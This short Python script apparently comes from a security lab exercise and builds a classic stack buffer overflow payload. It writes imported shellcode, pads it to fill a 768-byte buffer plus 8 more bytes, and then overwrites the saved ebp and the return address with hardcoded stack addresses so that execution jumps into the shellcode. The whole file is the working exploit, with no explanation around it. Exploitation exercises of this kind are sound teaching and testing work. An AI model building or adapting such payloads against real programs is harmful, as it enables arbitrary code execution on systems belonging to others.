import sys
from shellcode import shellcode

# Saved ebp
ebp = b"\xf8\xb1\xf6\xbf"

# Address of buf
buf_addr = b"\xd0\xae\xf6\xbf"

sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b"a" * (768 - len(shellcode)))
sys.stdout.buffer.write(b"a" * 8)
sys.stdout.buffer.write(ebp)
sys.stdout.buffer.write(buf_addr)


